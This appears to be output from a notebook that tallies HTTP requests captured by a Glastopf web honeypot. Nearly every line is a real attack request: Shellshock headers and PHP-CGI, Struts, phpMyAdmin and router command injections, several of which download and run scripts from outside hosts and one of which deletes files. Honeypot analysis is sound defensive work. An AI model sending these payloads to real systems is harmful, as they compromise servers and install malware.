# GET /cgi-bin/fom.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
# GET /cgi-bin/book.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
# GET /catalog/index.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
# GET /cgi-bin/cvsqueryform.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
# GET /cgi-bin/db_manager.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
# GET /cgi-bin/aglimpse.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    3
# ...
# GET /cgi-bin/bigconf.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    1
# GET / HTTP/1.0\r\nAccept: */*\r\nConnection: Keep-Alive\r\nHost: 54.68.96.53\r\nReferer: () { :;}; /bin/bash -c "wget -O /tmp/bbb www.redel.net.br/1.php?id=35342e36382e39362e3533"\r\nUser-Agent: () { :;}; /bin/bash -c "wget -O /tmp/bbb www.redel.net.br/1.php?id=35342e36382e39362e3533"    1
# GET /cgi-sys/entropysearch.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &");'    1
# GET /cgi-bin/blog/mt-check.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    1
# GET /cgi-mod/index.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &");'    1
# GET /cgi-bin/mailnews.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    1
# GET /cgi-bin/ax-admin.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    1
# GET /cgi-bin/ HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    1
# GET /cgi-sys/realsignup.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    1
# GET /edittag/edittag.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    1
# GET /cgi-bin/ikonboard/help.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    1
# GET /cgi-bin/hello HTTP/1.1\r\nAccept: */*\r\nHost: 54.68.96.53\r\nReferer: () { foo;};echo; /usr/bin/id\r\nUser-Agent: () { foo;};echo; /usr/bin/id    1
# GET /gitweb.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    1
# GET /cgi-bin/test.cgi HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://202.191.121.230/mzer.pl -O /tmp/mzer.pl;curl -O /tmp/mzer.pl http://202.191.121.230/mzer.pl;perl /tmp/mzer.pl;rm -rf /tmp/mzer.pl*");'    1
# GET /cgi-bin/wwwboard.cgi.cgi HTTP/1.0\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\nCookie: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nPragma: no-cache\r\nReferer: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nTest: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl\r\nUser-Agent: () { :; }; curl http://202.143.160.141/lib21/index.cgi | perl    1
# Length: 546, dtype: int64

# %%
glastopf_df[glastopf_df['request_raw'].str.contains('%')]['request_raw'].value_counts()
# Out:
# POST / HTTP/1.1\r\nAccept: */*\r\nConnection: Keep-Alive\r\nContent-Length: 395\r\nContent-Type: application/x-www-form-urlencoded\r\nExpect: 100-continue\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0\r\n\r\nredirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.setCharacterEncoding(%22UTF-8%22),%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res.getWriter().print(%22dir:%22),%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23res.getWriter().flush(),%23res.getWriter().close()}    47
# POST /login.action HTTP/1.1\r\nAccept: */*\r\nConnection: Keep-Alive\r\nContent-Length: 395\r\nContent-Type: application/x-www-form-urlencoded\r\nExpect: 100-continue\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0\r\n\r\nredirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.setCharacterEncoding(%22UTF-8%22),%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res.getWriter().print(%22dir:%22),%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23res.getWriter().flush(),%23res.getWriter().close()}    25
# GET /w00tw00t.at.blackhats.romanian.anti-sec:%29 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: ZmEu    19
# POST /index.action HTTP/1.1\r\nAccept: */*\r\nConnection: Keep-Alive\r\nContent-Length: 395\r\nContent-Type: application/x-www-form-urlencoded\r\nExpect: 100-continue\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0\r\n\r\nredirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.setCharacterEncoding(%22UTF-8%22),%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res.getWriter().print(%22dir:%22),%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23res.getWriter().flush(),%23res.getWriter().close()}    15
# POST /phpmyadmin/scripts/setup.php HTTP/1.1\r\nConnection: TE\r\nContent-Length: 206\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 162.197.24.67\r\nReferer: http://162.197.24.67/phpmyadmin/scripts/setup.php\r\nTe: deflate,gzip;q=0.3\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]\r\n\r\naction=lay_navigation&eoltype=unix&token=&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA%5FConfig%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A31%3A%22ftp%3A%2F%2F104%2E192%2E103%2E3%2Fwebmin3%2Ephp%22%3B%7D%7D    12
# POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\r\nAccept: text/html, application/xhtml+xml, */*\r\nConnection: Keep-Alive\r\nContent-Length: 25\r\nContent-Type: text/html\r\nExpect: 100-continue\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\r\n\r\n<?php echo xocoder123; ?>     5
# GET /w00tw00t.at.ISC.SANS.DFind:%29 HTTP/1.1                     4
# POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\r\nAccept: text/html, application/xhtml+xml, */*\r\nContent-Length: 25\r\nContent-Type: text/html\r\nExpect: 100-continue\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\r\n\r\n<?php echo xocoder123; ?>     4
# GET %3Ctitle%3EphpMyAdmin HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)     3
# POST //cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1\r\nContent-Length: 210\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: -c\r\n\r\n<? system("cd /tmp;wget http://pisosdemaderaw.com.mx/sekip/sekip.php;wget http://escoladeradio.com.br/website/wp-content/themes/radio/includes/new.txt;perl new.txt;rm -rf new.txt;rm -rf new.txt.*;rm -rf *"); ?>     3
# GET //%7E/PMA/scripts/setup.php HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 54.68.96.53     3
# POST / HTTP/1.1\r\nAccept: */*\r\nConnection: Keep-Alive\r\nContent-Length: 395\r\nContent-Type: application/x-www-form-urlencoded\r\nExpect: 100-continue\r\nHost: 162.197.24.67\r\nUser-Agent: Mozilla/5.0\r\n\r\nredirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.setCharacterEncoding(%22UTF-8%22),%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res.getWriter().print(%22dir:%22),%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23res.getWriter().flush(),%23res.getWriter().close()}     2
# POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\r\nAccept: text/html, application/xhtml+xml, */*\r\nContent-Length: 25\r\nContent-Type: text/html\r\nExpect: 100-continue\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\r\n\r\n<?php echo xocoder123; ?>     2
# POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\r\nConnection: close\r\nContent-Length: 160\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 54.68.96.53\r\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\r\n\r\n<?php\n system(" id;killall .klogd;cd /var/tmp;rm -rf ...;mkdir ...;cd ...;wget http://82.141.104.123/ispconfig/temp/.../.../x.tgz;tar xvfz x.tgz;./.klogd "); ?>     2
# GET /w00tw00t.at.blackhats.romanian.anti-sec:%29 HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-us\r\nConnection: Close\r\nHost: 162.197.24.67\r\nUser-Agent: ZmEu     2
# ...
# GET http://24x7-allrequestsallowed.com/?PHPSESSID=ce7742cf00143TVMR%5EHHA%5CA%5B HTTP/1.1\r\nAccept: */*\r\nHost: 24x7-allrequestsallowed.com\r\nProxy-Connection: Keep-Alive    1
# POST /tmUnblock.cgi HTTP/1.1\r\nContent-Length: 1036\r\n\r\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%65%32%65%66%38%62%62%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%65%32%65%66%38%62%62%64%20%68%74%74%70%3a%2f%2f%37%36%2e%31%37%37%2e%31%31%31%2e%32%35%33%3a%33%32%30%30%22%20%3e%3e%20%2e%65%32%65%66%38%62%62%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%65%32%65%66%38%62%62%64%22%20%3e%3e%20%2e%65%32%65%66%38%62%62%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%65%32%65%66%38%62%62%64%22%20%3e%3e%20%2e%65%32%65%66%38%62%62%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%65%32%65%66%38%62%62%64%22%20%3e%3e%20%2e%65%32%65%66%38%62%62%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%65%32%65%66%38%62%62%64%2e%73%68%3b%2e%2f%2e%65%32%65%66%38%62%62%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1
# POST /tmUnblock.cgi HTTP/1.1\r\nContent-Length: 1033\r\n\r\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%61%35%31%36%36%65%32%36%20%68%74%74%70%3a%2f%2f%32%31%31%2e%32%34%2e%31%35%2e%31%38%36%3a%33%32%30%30%22%20%3e%3e%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%61%35%31%36%36%65%32%36%22%20%3e%3e%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%61%35%31%36%36%65%32%36%22%20%3e%3e%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%61%35%31%36%36%65%32%36%22%20%3e%3e%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%2e%2f%2e%61%35%31%36%36%65%32%36%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1
# POST /tmUnblock.cgi HTTP/1.1\r\nContent-Length: 1036\r\n\r\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%65%39%65%31%33%61%36%39%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%65%39%65%31%33%61%36%39%20%68%74%74%70%3a%2f%2f%31%34%39%2e%31%32%39%2e%35%38%2e%31%31%35%3a%33%32%30%30%22%20%3e%3e%20%2e%65%39%65%31%33%61%36%39%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%65%39%65%31%33%61%36%39%22%20%3e%3e%20%2e%65%39%65%31%33%61%36%39%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%65%39%65%31%33%61%36%39%22%20%3e%3e%20%2e%65%39%65%31%33%61%36%39%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%65%39%65%31%33%61%36%39%22%20%3e%3e%20%2e%65%39%65%31%33%61%36%39%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%65%39%65%31%33%61%36%39%2e%73%68%3b%2e%2f%2e%65%39%65%31%33%61%36%39%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1
# POST /tmUnblock.cgi HTTP/1.1\r\nContent-Length: 1033\r\n\r\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%30%38%38%63%31%36%36%63%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%30%38%38%63%31%36%36%63%20%68%74%74%70%3a%2f%2f%37%38%2e%38%33%2e%31%34%37%2e%31%33%34%3a%33%32%30%30%22%20%3e%3e%20%2e%30%38%38%63%31%36%36%63%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%30%38%38%63%31%36%36%63%22%20%3e%3e%20%2e%30%38%38%63%31%36%36%63%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%30%38%38%63%31%36%36%63%22%20%3e%3e%20%2e%30%38%38%63%31%36%36%63%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%30%38%38%63%31%36%36%63%22%20%3e%3e%20%2e%30%38%38%63%31%36%36%63%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%30%38%38%63%31%36%36%63%2e%73%68%3b%2e%2f%2e%30%38%38%63%31%36%36%63%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1
# POST /tmUnblock.cgi HTTP/1.1\r\nContent-Length: 1036\r\n\r\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%31%32%31%31%64%66%36%62%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%31%32%31%31%64%66%36%62%20%68%74%74%70%3a%2f%2f%31%39%33%2e%31%30%38%2e%34%39%2e%31%35%34%3a%33%32%30%30%22%20%3e%3e%20%2e%31%32%31%31%64%66%36%62%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%31%32%31%31%64%66%36%62%22%20%3e%3e%20%2e%31%32%31%31%64%66%36%62%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%31%32%31%31%64%66%36%62%22%20%3e%3e%20%2e%31%32%31%31%64%66%36%62%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%31%32%31%31%64%66%36%62%22%20%3e%3e%20%2e%31%32%31%31%64%66%36%62%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%31%32%31%31%64%66%36%62%2e%73%68%3b%2e%2f%2e%31%32%31%31%64%66%36%62%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1
